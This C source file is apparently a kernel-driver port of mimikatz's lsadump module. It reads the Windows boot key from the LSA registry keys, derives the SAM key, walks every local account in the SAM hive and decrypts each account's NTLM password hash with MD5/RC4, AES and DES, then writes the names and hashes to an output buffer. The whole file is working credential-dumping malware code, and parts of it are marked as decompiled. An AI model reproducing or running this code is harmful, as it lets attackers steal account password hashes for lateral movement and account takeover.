#include "minimimikatz.h"

#include "xlog.h"
#include "system.h"
#include "crypto.h"


NTSTATUS mimikatz_getSysKey(PSYSKEY pSys) {
	UNICODE_STRING uniLsa;
	RtlInitUnicodeString(&uniLsa, L"\\REGISTRY\\MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa");
	OBJECT_ATTRIBUTES obj;
	InitializeObjectAttributes(&obj, &uniLsa, OBJ_CASE_INSENSITIVE, NULL, NULL);
	HANDLE hLsa;
	NTSTATUS statux = ZwOpenKey(&hLsa, KEY_ALL_ACCESS, &obj);
	if (!NT_SUCCESS(statux)) {
		xLog("mimikatz: getsyskey() open lsa failed");
		return statux;
	}
	const wchar_t * kuhl_m_lsadump_SYSKEY_NAMES[] = { L"JD", L"Skew1", L"GBG", L"Data" };
	const BYTE kuhl_m_lsadump_SYSKEY_PERMUT[] = { 11, 6, 7, 1, 8, 10, 14, 0, 3, 5, 2, 15, 13, 9, 12, 4 };
	wchar_t buffer[8 + 1];
	DWORD szBuffer;
	BYTE buffKey[SYSKEY_LENGTH];
	DWORD i;
	BOOL status = TRUE;
	for (i = 0; (i < ARRAYSIZE(kuhl_m_lsadump_SYSKEY_NAMES)) && status; i++)
	{
		status = FALSE;
		/*if (kull_m_registry_RegOpenKeyEx(hRegistry, hLSA, kuhl_m_lsadump_SYSKEY_NAMES[i], 0, KEY_READ, &hKey))
		{
			szBuffer = 8 + 1;
			if (kull_m_registry_RegQueryInfoKey(hRegistry, hKey, buffer, &szBuffer, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL))
				
			kull_m_registry_RegCloseKey(hRegistry, hKey);
		}*/
		//start reading fucking key
		RtlInitUnicodeString(&uniLsa, kuhl_m_lsadump_SYSKEY_NAMES[i]);
		InitializeObjectAttributes(&obj, &uniLsa, OBJ_CASE_INSENSITIVE, hLsa, NULL);
		HANDLE hSubKey;
		statux = ZwOpenKey(&hSubKey, KEY_ALL_ACCESS, &obj);
		if (!NT_SUCCESS(statux)) {
			xLog("mimikatz: getsyskey() open subkey failed");
			goto GET_SYS_KEY_CLEAN;
		}
		ULONG keyFullInfoLength = 0;
		ZwQueryKey(
			hSubKey,
			KeyFullInformation,
			NULL,
			0,
			&keyFullInfoLength
		);
		if (keyFullInfoLength == 0) {
			xLog("mimikatz: getsyskey() get subkeyinfo length failed");
			ZwClose(hSubKey);
			goto GET_SYS_KEY_CLEAN;
		}
		PKEY_FULL_INFORMATION pKfi = (PKEY_FULL_INFORMATION)ExAllocatePool(NonPagedPool, keyFullInfoLength + 2);
		memset(pKfi, 0, keyFullInfoLength + 2);
		statux = ZwQueryKey(
			hSubKey,
			KeyFullInformation,
			pKfi,
			keyFullInfoLength,
			&keyFullInfoLength
		);
		if (!NT_SUCCESS(statux)) {
			xLog("mimikatz: getsyskey() get subkeyinfo failed");
			ExFreePool(pKfi);
			ZwClose(hSubKey);
			goto GET_SYS_KEY_CLEAN;
		}

		memcpy(buffer, pKfi->Class, sizeof(buffer));
		ExFreePool(pKfi);
		ZwClose(hSubKey);
		status = swscanf_s(buffer, L"%x", (DWORD *)&buffKey[i * sizeof(DWORD)]) != -1;
		//else PRINT_ERROR(L"LSA Key Class read error\n");
	}

	if (status)
		for (i = 0; i < SYSKEY_LENGTH; i++)
			pSys->data[i] = buffKey[kuhl_m_lsadump_SYSKEY_PERMUT[i]];
GET_SYS_KEY_CLEAN:
	ZwClose(hLsa);
	return statux;
}

const BYTE kuhl_m_lsadump_qwertyuiopazxc[] = "!@#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%";
const BYTE kuhl_m_lsadump_01234567890123[] = "0123456789012345678901234567890123456789";
NTSTATUS mimikatz_getSamKey(PSAMKEY pSamkey, PSYSKEY pSyskey) {
	
	PKEY_VALUE_PARTIAL_INFORMATION pKpi = (PKEY_VALUE_PARTIAL_INFORMATION)ExAllocatePool(NonPagedPool, 4096);
	//query 
	NTSTATUS statux = queryRegA("\\REGISTRY\\MACHINE\\SAM\\SAM\\Domains\\Account", "F", pKpi, 4096);
	if (!NT_SUCCESS(statux)) {
		ExFreePool(pKpi);
		return statux;
	}
	//decrypt
	BOOL status = FALSE;
	MD5_CTX md5ctx;
	UCHAR rc4key[MD5_DIGEST_LENGTH];
	//DATA_KEY key = { MD5_DIGEST_LENGTH, MD5_DIGEST_LENGTH, md5ctx.digest };
	//CRYPT_BUFFER data = { SAM_KEY_DATA_KEY_LENGTH, SAM_KEY_DATA_KEY_LENGTH, samKey };
	
	PSAM_KEY_DATA_AES pAesKey;
	PVOID out;
	DWORD len;

	PDOMAIN_ACCOUNT_F pDomAccF = pKpi->Data;
	switch (pDomAccF->Revision)
	{
	case 2:
	case 3:
		switch (pDomAccF->keys1.Revision)
		{
		case 1:
			//md5
			xLog("mimikatz: sam key case md5 rc4");
			MD5Init(&md5ctx);
			MD5Update(&md5ctx, pDomAccF->keys1.Salt, SAM_KEY_DATA_SALT_LENGTH);
			MD5Update(&md5ctx, kuhl_m_lsadump_qwertyuiopazxc, sizeof(kuhl_m_lsadump_qwertyuiopazxc));
			MD5Update(&md5ctx, pSyskey->data, SYSKEY_LENGTH);
			MD5Update(&md5ctx, kuhl_m_lsadump_01234567890123, sizeof(kuhl_m_lsadump_01234567890123));
			MD5Final(&md5ctx, rc4key);

			CHAR debugStr[100];
			RtlStringCbPrintfA(debugStr, 100, "rc4key: %02x%02x%02x%02x %02x%02x%02x%02x", rc4key[0], rc4key[1], rc4key[2], rc4key[3],
				rc4key[4], rc4key[5], rc4key[6], rc4key[7]
			);
			xLog(debugStr);

			RtlCopyMemory(pSamkey->data, pDomAccF->keys1.Key, SAM_KEY_DATA_KEY_LENGTH);
			//rc4
			rc4enc(rc4key, 16, pSamkey->data, 16);

			//if (!(status = NT_SUCCESS(RtlDecryptData2(&data, &key))))
			//	PRINT_ERROR(L"RtlDecryptData2 KO");
			//md5
			//rc4
			break;
		case 2:
			xLog("mimikatz: sam key case aes128");
			pAesKey = (PSAM_KEY_DATA_AES)&pDomAccF->keys1;
			/*if (kull_m_crypto_genericAES128Decrypt(sysKey, pAesKey->Salt, pAesKey->data, pAesKey->DataLen, &out, &len))
			{
				if (status = (len == SAM_KEY_DATA_KEY_LENGTH))
					RtlCopyMemory(samKey, out, SAM_KEY_DATA_KEY_LENGTH);
				
			}*/
			//aes decrypt
			AES_CTX aesCtx;
			AES_init_ctx_iv(&aesCtx, pSyskey->data, pAesKey->Salt);
			AES_CBC_decrypt_buffer(&aesCtx, pAesKey->data, pAesKey->DataLen);
			memcpy(pSamkey->data, pAesKey->data, SAM_KEY_DATA_KEY_LENGTH);
			break;
		default:
			//DbgPrint(L"Unknow Struct Key revision (%u)", pDomAccF->keys1.Revision);
			xLog("mimikatz: Unknow Struct Key revision");
		}
		break;
	default:
		//DbgPrint(L"Unknow F revision (%hu)", pDomAccF->Revision);
		xLog("mimikatz: Unknow F revision");
	}
	ExFreePool(pKpi);
	return STATUS_SUCCESS;
}


NTSTATUS user_UsersInfo(PCHAR buff, ULONG maxLen) {
	if (maxLen < 100) {
		return STATUS_INSUFFICIENT_RESOURCES;
	}
	memset(buff, 0, 100);
	NTSTATUS status;
	SYSKEY sysKey;
	ULONG strIndex = 0;
	status = mimikatz_getSysKey(&sysKey);
	if (!NT_SUCCESS(status)) {
		xLog("get syskey failed");
		RtlStringCbLengthA(buff, maxLen, &strIndex);
		RtlStringCbPrintfA(buff + strIndex, maxLen - strIndex, "[mimikatz]get syskey failed %p", status);
		return STATUS_SUCCESS;
	}
	SAMKEY samKey;
	status = mimikatz_getSamKey(&samKey, &sysKey);
	if (!NT_SUCCESS(status)) {
		xLog("get samkey failed");
		RtlStringCbLengthA(buff, maxLen, &strIndex);
		RtlStringCbPrintfA(buff + strIndex, maxLen - strIndex, "[mimikatz]get samkey failed %p", status);
		return STATUS_SUCCESS;
	}
	//print syskey
	RtlStringCbLengthA(buff, maxLen, &strIndex);
	RtlStringCbPrintfA(buff + strIndex, maxLen - strIndex, "[mimikatz]SYSKEY: ");
	for (ULONG i = 0; i < SYSKEY_LENGTH; i++) {
		RtlStringCbLengthA(buff, maxLen, &strIndex);
		RtlStringCbPrintfA(buff + strIndex, maxLen - strIndex, "%02x", (UCHAR)(sysKey.data[i]));
	}
	RtlStringCbLengthA(buff, maxLen, &strIndex);
	RtlStringCbPrintfA(buff + strIndex, maxLen - strIndex, "\n");
	//print samkey
	RtlStringCbLengthA(buff, maxLen, &strIndex);
	RtlStringCbPrintfA(buff + strIndex, maxLen - strIndex, "[mimikatz]SAMKEY: ");
	for (ULONG i = 0; i < SAM_KEY_DATA_KEY_LENGTH; i++) {
		RtlStringCbLengthA(buff, maxLen, &strIndex);
		RtlStringCbPrintfA(buff + strIndex, maxLen - strIndex, "%02x", (UCHAR)(samKey.data[i]));
	}
	RtlStringCbLengthA(buff, maxLen, &strIndex);
	RtlStringCbPrintfA(buff + strIndex, maxLen - strIndex, "\n");
	
	//Open SAM Account
	HANDLE hSamAccount;
	
	OBJECT_ATTRIBUTES obj;

	UNICODE_STRING uniSamAccountPath;
	RtlInitUnicodeString(&uniSamAccountPath, SAM_ACCOUNT_PATH);

	InitializeObjectAttributes(&obj, &uniSamAccountPath, OBJ_CASE_INSENSITIVE, NULL, NULL);

	status = ZwOpenKey(
		&hSamAccount,
		KEY_ALL_ACCESS,
		&obj
	);
	if (!NT_SUCCESS(status)) {
		xLog("mimikatz: open sam account failed");
		return status;
	}
	else
	{
		xLog("mimikatz: open sam account success");
	}
	ULONG samAccountLength = 0;
	status = ZwQueryKey(hSamAccount, KeyFullInformation, NULL, 0, &samAccountLength);
	if (samAccountLength == 0) {
		xLog("mimikatz: query sam account length failed");
		ZwClose(hSamAccount);
		return status;
	}
	PKEY_FULL_INFORMATION pKfi = (PKEY_FULL_INFORMATION)ExAllocatePool(NonPagedPool, samAccountLength);
	status = ZwQueryKey(hSamAccount, KeyFullInformation, pKfi, samAccountLength, &samAccountLength);
	if (!NT_SUCCESS(status) || samAccountLength == 0) {
		xLog("mimikatz: query sam account full info failed");
		ZwClose(hSamAccount);
		ExFreePool(pKfi);
		return status;
	}
	ULONG subKeyCount = pKfi->SubKeys;
	ExFreePool(pKfi);
	//Enum sub key
	PKEY_BASIC_INFORMATION pKbi = NULL;
	ULONG subKeyLength;
	
	for (ULONG i = 0; i < subKeyCount; i++) {
		//get sub key length
		subKeyLength = 0;
		status = ZwEnumerateKey(hSamAccount, i, KeyBasicInformation, NULL, 0, &subKeyLength);
		if (subKeyLength == 0) {
			xLog("mimikatz: enum sub key length failed");
			ZwClose(hSamAccount);
			return status;
		}
		pKbi = (PKEY_BASIC_INFORMATION)ExAllocatePool(NonPagedPool, subKeyLength + 2);
		//To Avoid String Error
		//set the last wchar to 0
		((PCHAR)pKbi)[subKeyLength] = 0;
		((PCHAR)pKbi)[subKeyLength + 1] = 0;

		status = ZwEnumerateKey(hSamAccount, i, KeyBasicInformation, pKbi, subKeyLength, &subKeyLength);
		if (!NT_SUCCESS(status)) {
			xLog("mimikatz: enum sub key basic info failed");
			ZwClose(hSamAccount);
			ExFreePool(pKbi);
			return status;
		}
		status = RtlStringCbLengthA(buff, maxLen, &strIndex);
		if (!NT_SUCCESS(status)) {
			xLog("mimikatz: critical buff error");
			ZwClose(hSamAccount);
			ExFreePool(pKbi);
			return status;
		}
		
		if (pKbi->Name != NULL && memcmp(pKbi->Name, L"Names", sizeof(L"Names") - 2) != 0) {
			UNICODE_STRING uniName;
			RtlInitUnicodeString(&uniName, pKbi->Name);
			__try {
				status = RtlStringCbPrintfA(buff + strIndex, maxLen - strIndex, "[mimikatz]sub key name: %S\n", pKbi->Name);
			}
			__except(1) {
				xLog("mimikatz: user buff write except!");
			}
			HANDLE hSubKey;
			InitializeObjectAttributes(&obj, &uniName, OBJ_CASE_INSENSITIVE, hSamAccount, NULL);
			status = ZwOpenKey(&hSubKey, KEY_ALL_ACCESS, &obj);
			if (!NT_SUCCESS(status)) {
				xLog("mimikatz: failed to open subkey");
				ZwClose(hSamAccount);
				ExFreePool(pKbi);
				return status;
			}
			//query F and V
			UNICODE_STRING uniF;
			RtlInitUnicodeString(&uniF, L"F");
			UNICODE_STRING uniV;
			RtlInitUnicodeString(&uniV, L"V");
			ULONG keyVLength = 0;
			ZwQueryValueKey(
				hSubKey,
				&uniV,
				KeyValuePartialInformation,
				NULL,
				0,
				&keyVLength
			);
			RtlStringCbLengthA(buff, maxLen, &strIndex);
			RtlStringCbPrintfA(buff + strIndex, maxLen - strIndex, "[mimikatz]user V length 1: %d\n", keyVLength);
			if (keyVLength == 0) {
				xLog("mimikatz: query V length failed");
				goto CLOSE_SUBKEY;
			}
			PKEY_VALUE_PARTIAL_INFORMATION pVKpi = (PKEY_VALUE_PARTIAL_INFORMATION)ExAllocatePool(NonPagedPool, keyVLength);
			status = ZwQueryValueKey(
				hSubKey,
				&uniV,
				KeyValuePartialInformation,
				pVKpi,
				keyVLength,
				&keyVLength
			);
			if (!NT_SUCCESS(status)) {
				xLog("mimikatz: query V kpi failed");
				ExFreePool(pVKpi);
				goto CLOSE_SUBKEY;
			}
			PUSER_ACCOUNT_V pUserV = pVKpi->Data;
			__try {
				RtlStringCbLengthA(buff, maxLen, &strIndex);
				RtlStringCbPrintfA(buff + strIndex, maxLen - strIndex, "[mimikatz]user V length 2: %d\n", keyVLength);
				RtlStringCbLengthA(buff, maxLen, &strIndex);
				RtlStringCbPrintfA(buff + strIndex, maxLen - strIndex, "[mimikatz]user name: %.*S\n", pUserV->Username.length / sizeof(wchar_t), (wchar_t *)(pUserV->datas + pUserV->Username.offset));
			}
			__except (1) {
				xLog("mimikatz: user name write except!");
			}

			//CTMD NTLM
			DWORD rid;
			status = RtlUnicodeStringToInteger(&uniName, 16, &rid);
			if (!NT_SUCCESS(status)) {
				goto FREE_V_CLOSE;
			}
			NTLM ntlm;
			kuhl_m_lsadump_getHash(&pUserV->NTLMHash, pUserV->datas, samKey.data, rid, TRUE, FALSE, &ntlm);
			//print NTLM
			RtlStringCbLengthA(buff, maxLen, &strIndex);
			RtlStringCbPrintfA(buff + strIndex, maxLen - strIndex, "[mimikatz]NTLM: ");
			for (ULONG i = 0; i < LM_NTLM_HASH_LENGTH; i++) {
				RtlStringCbLengthA(buff, maxLen, &strIndex);
				RtlStringCbPrintfA(buff + strIndex, maxLen - strIndex, "%02x", (UCHAR)(ntlm.data[i]));
			}
			RtlStringCbLengthA(buff, maxLen, &strIndex);
			RtlStringCbPrintfA(buff + strIndex, maxLen - strIndex, "\n");



		FREE_V_CLOSE:
			ExFreePool(pVKpi);
		CLOSE_SUBKEY:
			ZwClose(hSubKey);

		}
		//get other info
		ExFreePool(pKbi);
	}
	ZwClose(hSamAccount);
	return STATUS_SUCCESS;
}




//from ida

char * KeysFromIndex(char *a1, BYTE *a2)
{
	BYTE *v2; // r9
	char *result; // rax
	char v4; // r8

	v2 = a2 + 14;
	result = a1;
	while (a2 < v2)
	{
		v4 = *result++;
		*a2++ = v4;
		if (result == a1 + 4)
			result = a1;
	}
	return result;
}


NTSTATUS SystemFunction002(const BYTE * data,
	const BYTE * key,
	PCHAR output
) {
	if (!data || !output)
		return STATUS_UNSUCCESSFUL;
	CRYPT_DESunhash(output, key, data);
	return STATUS_SUCCESS;
}

NTSTATUS SystemFunction025(const BYTE *in, const BYTE *key, BYTE* out)
{
	BYTE deskey[0x10];

	memcpy(deskey, key, 4);
	memcpy(deskey + 4, key, 4);
	memcpy(deskey + 8, key, 4);
	memcpy(deskey + 12, key, 4);

	CRYPT_DESunhash(out, deskey, in);
	CRYPT_DESunhash(out + 8, deskey + 7, in + 8);
	return STATUS_SUCCESS;
}

BOOL kuhl_m_lsadump_dcsync_decrypt(BYTE* encodedData, DWORD encodedDataSize, DWORD rid) {
	BYTE data[LM_NTLM_HASH_LENGTH];
	BOOL res =  NT_SUCCESS(SystemFunction025(encodedData, &rid, data));
	memcpy(encodedData, data, LM_NTLM_HASH_LENGTH);
}

const BYTE	kuhl_m_lsadump_NTPASSWORD[] = "NTPASSWORD",
kuhl_m_lsadump_LMPASSWORD[] = "LMPASSWORD",
kuhl_m_lsadump_NTPASSWORDHISTORY[] = "NTPASSWORDHISTORY",
kuhl_m_lsadump_LMPASSWORDHISTORY[] = "LMPASSWORDHISTORY";
BOOL kuhl_m_lsadump_getHash(PSAM_SENTRY pSamHash, PCHAR pStartOfData, PCHAR samKey, DWORD rid, BOOL isNtlm, BOOL isHistory, PNTLM pNtlm)
{
	BOOL status = FALSE;
	MD5_CTX md5ctx;
	PSAM_HASH pHash = (PSAM_HASH)(pStartOfData + pSamHash->offset);
	PSAM_HASH_AES pHashAes;
	CHAR key[MD5_DIGEST_LENGTH];
	//DATA_KEY keyBuffer = { MD5_DIGEST_LENGTH, MD5_DIGEST_LENGTH, md5ctx.digest };
	//CRYPT_BUFFER cypheredHashBuffer = { 0, 0, NULL };
	PVOID out;
	DWORD len;

	if (pSamHash->offset && pSamHash->length)
	{
		switch (pHash->Revision)
		{
		case 1:
			if (pSamHash->length >= sizeof(SAM_HASH))
			{
				MD5Init(&md5ctx);
				MD5Update(&md5ctx, samKey, SAM_KEY_DATA_KEY_LENGTH);
				MD5Update(&md5ctx, &rid, sizeof(DWORD));
				MD5Update(&md5ctx, isNtlm ? (isHistory ? kuhl_m_lsadump_NTPASSWORDHISTORY : kuhl_m_lsadump_NTPASSWORD) : (isHistory ? kuhl_m_lsadump_LMPASSWORDHISTORY : kuhl_m_lsadump_LMPASSWORD), isNtlm ? (isHistory ? sizeof(kuhl_m_lsadump_NTPASSWORDHISTORY) : sizeof(kuhl_m_lsadump_NTPASSWORD)) : (isHistory ? sizeof(kuhl_m_lsadump_LMPASSWORDHISTORY) : sizeof(kuhl_m_lsadump_LMPASSWORD)));
				MD5Final(&md5ctx, key);
				//rc4
				memcpy(pNtlm->data, pHash->data, LM_NTLM_HASH_LENGTH);
				rc4enc(key, 16, pNtlm->data, 16);
				status = TRUE;
				//cypheredHashBuffer.Length = cypheredHashBuffer.MaximumLength = pSamHash->length - FIELD_OFFSET(SAM_HASH, data);
				//if (cypheredHashBuffer.Buffer = (PBYTE)LocalAlloc(LPTR, cypheredHashBuffer.Length))
				//{
				//	RtlCopyMemory(cypheredHashBuffer.Buffer, pHash->data, cypheredHashBuffer.Length);
				//	if (!(status = NT_SUCCESS(RtlDecryptData2(&cypheredHashBuffer, &keyBuffer))))
				//		PRINT_ERROR(L"RtlDecryptData2\n");
				//}
			}
			break;
		case 2:
			pHashAes = (PSAM_HASH_AES)pHash;
			if (pHashAes->dataOffset >= SAM_KEY_DATA_SALT_LENGTH)
			{
				/*if (kull_m_crypto_genericAES128Decrypt(samKey, pHashAes->Salt, pHashAes->data, pSamHash->lenght - FIELD_OFFSET(SAM_HASH_AES, data), &out, &len))
				{
					cypheredHashBuffer.Length = cypheredHashBuffer.MaximumLength = len;
					if (cypheredHashBuffer.Buffer = (PBYTE)LocalAlloc(LPTR, cypheredHashBuffer.Length))
					{
						RtlCopyMemory(cypheredHashBuffer.Buffer, out, len);
						status = TRUE;
					}
					LocalFree(out);
				}*/
				AES_CTX aesCtx;
				AES_init_ctx_iv(&aesCtx, samKey, pHashAes->Salt);
				AES_CBC_decrypt_buffer(&aesCtx, pHashAes->data, pSamHash->length - FIELD_OFFSET(SAM_HASH_AES, data));
				memcpy(pNtlm->data, pHashAes->data, LM_NTLM_HASH_LENGTH);
				status = TRUE;
			}
			break;
		default:
			xLog(L"Unknow SAM_HASH revision (%hu)\n");
		}
		if (status)
			kuhl_m_lsadump_dcsync_decrypt(pNtlm->data, LM_NTLM_HASH_LENGTH, rid);// , isNtlm ? (isHistory ? L"ntlm" : L"NTLM") : (isHistory ? L"lm  " : L"LM  "), isHistory);
	
	}
	return status;
}
